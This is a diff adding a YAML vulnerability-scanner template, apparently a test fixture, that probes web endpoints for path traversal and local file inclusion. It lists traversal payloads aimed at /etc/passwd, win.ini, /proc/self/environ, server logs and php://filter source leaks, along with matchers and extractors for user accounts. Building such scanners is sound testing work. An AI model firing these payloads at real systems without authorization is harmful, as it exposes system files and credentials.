@@ -1,0 +1,114 @@
+id: test-path-traversal
+info:
+  name: Test Path Traversal Template
+  author: Anarchy Copilot Team
+  severity: high
+  description: Test template for path traversal and LFI/RFI detection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file={{injection}}"
+      - "{{BaseURL}}/include={{injection}}"
+      - "{{BaseURL}}/load={{injection}}"
+      - "{{BaseURL}}/read={{injection}}"
+    
+    payloads:
+      injection:
+        - "../../../etc/passwd"
+        - "..\\..\\..\\windows\\win.ini"
+        - "/etc/passwd"
+        - "C:\\Windows\\system.ini"
+        - "file:///etc/passwd"
+        - "/proc/self/environ"
+        - "/var/log/apache2/access.log"
+        - "php://filter/convert.base64-encode/resource=index.php"
+
+    headers:
+      User-Agent: Mozilla/5.0 AnarchyCopilot/Test
+
+    matchers-condition: or
+    matchers:
+      # Unix-like system files
+      - type: word
+        words:
+          - "root:x:"
+          - "bin:x:"
+          - "nobody:x:"
+        condition: or
+        part: response
+
+      # Windows system files
+      - type: word
+        words:
+          - "[extensions]"
+          - "[fonts]"
+          - "[mci extensions]"
+        condition: or
+        part: response
+
+      # Common sensitive files
+      - type: regex
+        regex:
+          - "phpinfo()"
+          - "HTTP_USER_AGENT"
+          - "DOCUMENT_ROOT"
+          - "PATH="
+          - "HTTP_ACCEPT"
+        part: response
+
+      # Error messages indicating potential vulnerability
+      - type: regex
+        regex:
+          - "failed to open stream"
+          - "include_path"
+          - "Failed opening"
+          - "Permission denied"
+        part: response
+
+    extractors:
+      - type: regex
+        name: unix_users
+        regex:
+          - "[a-zA-Z]+:x:[0-9]+:[0-9]+:"
+        group: 0
+
+      - type: regex
+        name: windows_paths
+        regex:
+          - "[A-Z]:\\\\[\\\\a-zA-Z0-9._-]+"
+        group: 0
+
+    stop-at-first-match: false
+    max-redirects: 2
+    redirects: true
+
+    # Additional request methods
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/import"
+    
+    body: "file={{injection}}"
+    
+    payloads:
+      injection:
+        - "../../etc/passwd%00"
+        - "..%252f..%252f..%252fetc/passwd"
+        - "..\\..\\.:\\windows\\system.ini"
+        - "file:///etc/passwd"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 AnarchyCopilot/Test
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "[extensions]"
+        condition: or
+        part: response
+
+    unsafe: true  # Allow potentially unsafe paths
